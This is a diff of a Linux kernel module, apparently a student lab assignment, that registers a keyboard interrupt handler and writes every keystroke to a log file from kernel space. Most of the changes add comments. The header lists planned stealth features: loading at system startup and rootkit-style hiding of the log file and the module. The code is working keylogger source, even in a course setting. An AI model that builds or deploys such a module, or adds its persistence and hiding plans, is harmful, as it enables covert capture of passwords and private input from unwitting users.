@@ -1,22 +1,30 @@
 /*
- * kb.c
+ * Author: Jordan Sparks
+ * COSC 4327 Lab 3 "B" Option part b, for "A" Option.
+ * **************************************************
+ * Description: A Linux kernel module that registers a keyboard IRQ
+ * handler (ISR) and logs the keystrokes as they are received. To keep
+ * the ISR as short as possible, each scancode is passed to a tasklet
+ * that is then run at the next available time and logs the key.
+ * **************************************************
+ * Features to add later:
+ * -Add module to system startup by appending itself to the proper 
+ *  configuration file. These may differ for each distribution.
+ * -Add rootkit abilities; hide log file from user view, hide module's
+ *  prescence from user view.
+ * -Get date and add to log file each run.
+ * -Process all special keys.
  */
 
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/interrupt.h>
 #include <asm/io.h>
-
 #include <linux/fs.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
 #include <linux/buffer_head.h>
 #include <linux/string.h>
-
-#include <linux/kthread.h>
-#include <linux/sched.h>
-#include <linux/delay.h>
-#include <linux/cdev.h>
 
 #define KB_IRQ 1
 
@@ -26,20 +34,17 @@ struct file* log_fp;
 loff_t log_offset;
 struct task_struct *logger;
 
+/* Stores information for logging. As of now, only the scancode is needed */
 struct logger_data{
 	unsigned char scancode;
 } ld;
 
 /* =================================================================== */
 
+/* Opens a file from kernel space. */
 struct file* log_open(const char *path, int flags, int rights)
 {
 	struct file *fp = NULL;
-	/* Since we are passing kernel addresses to system calls, we must pass 
-	 * a user space address into each system call. It is generally a bad 
-	 * idea to handle files from a kernel module, however this is the 
-	 * quickest way for this keylogger. 
-	 */
 	mm_segment_t old_fs;
 	int error = 0;
 
@@ -54,6 +59,7 @@ struct file* log_open(const char *path, int flags, int rights)
 	set_fs(old_fs);
 
 	if(IS_ERR(fp)){
+		/* Debugging... */
 		error = PTR_ERR(fp);
 		printk("log_open(): ERROR = %d", error);
 		return NULL;
@@ -62,11 +68,13 @@ struct file* log_open(const char *path, int flags, int rights)
 	return fp;
 }
 
+/* Closes file handle. */
 void log_close(struct file *fp)
 {
 	filp_close(fp, NULL);
 }
 
+/* Writes buffer to file from kernel space. */
 int log_write(struct file *fp, unsigned char *data,
 		unsigned int size)
 {
@@ -86,6 +94,7 @@ int log_write(struct file *fp, unsigned char *data,
 
 /* =================================================================== */
 
+/* Converts scancode to key and writes it to log file. */
 void tasklet_logger(unsigned long data)
 {
 	static int shift = 0;
@@ -289,8 +298,10 @@ void tasklet_logger(unsigned long data)
 	}
 }
 
+/* Registers the tasklet for logging keys. */
 DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);
 
+/* ISR for keyboard IRQ. */
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 {
 	/* Set global value to the received scancode. */
@@ -305,14 +316,10 @@ irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 	return (irq_handler_t)IRQ_HANDLED;
 }
 
+/* Module entry point. */
 static int __init kb_init(void)
 {
 	int ret;
-
-	/* TODO:
-	 * Insert module into system startup by adding to /etc/modules.conf?
-	 * Note this file may be different for each distro
-	 */
 
 	/* Open log file as write only, create if it doesn't exist. */
 	log_fp = log_open(LOG_FILE, O_WRONLY | O_CREAT, 0644);
@@ -321,9 +328,11 @@ static int __init kb_init(void)
 		return 1;
 	}
 	else{
-		/* Log file opened, write header. */
+		/* Log file opened, print debug message. */
 		printk(KERN_INFO "SUCCESSFULLY opened log file.\n");
-		unsigned char buf[32];
+
+		/* Write title to log file. */
+		char buf[32];
 		memset(buf, 0, sizeof(buf));
 		strcpy(buf, "-LOG START-\n\n");
 		log_write(log_fp, buf, sizeof(buf));
@@ -339,6 +348,7 @@ static int __init kb_init(void)
 	return ret;
 }
 
+/* On module exit. */
 static void __exit kb_exit(void)
 {
 	/* Free the logging tasklet. */
@@ -356,5 +366,3 @@ static void __exit kb_exit(void)
 MODULE_LICENSE("GPL");
 module_init(kb_init);
 module_exit(kb_exit);
-
-/* EXPORT_NO_SYMBOLS; */
